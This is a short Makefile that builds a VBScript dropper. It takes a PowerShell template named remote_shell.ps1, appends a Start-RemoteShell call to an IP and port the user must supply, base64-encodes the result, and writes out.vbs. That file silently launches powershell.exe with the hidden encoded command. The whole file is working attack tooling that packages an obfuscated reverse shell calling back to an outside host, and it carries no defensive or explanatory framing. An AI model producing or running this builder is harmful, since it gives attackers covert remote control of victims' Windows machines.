TEMPLATE=remote_shell.ps1
VBS=out.vbs

check_defined = \
	$(strip $(foreach 1,$1, \
		$(call __check_defined,$1,$(strip $(value 2)))))

__check_defined = \
	$(if $(value $1),, \
		$(error Undefined $1$(if $2, ($2))))

all:
	$(call check_defined, IP)
	$(call check_defined, PORT)
	{ \
	set -e ;\
	PS_B64=$$(eval \(cat $(TEMPLATE) \&\& echo "Start-RemoteShell \"$(IP)\" $(PORT)"\) | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n") ;\
	echo "Dim oShell : Set oShell = CreateObject(\"WScript.Shell\")" > $(VBS) ;\
	echo "oShell.Run \"powershell.exe -EncodedCommand $$PS_B64\", 0, True" >> $(VBS) ;\
	}

clean:
	rm -rf $(VBS)

mrproper: clean
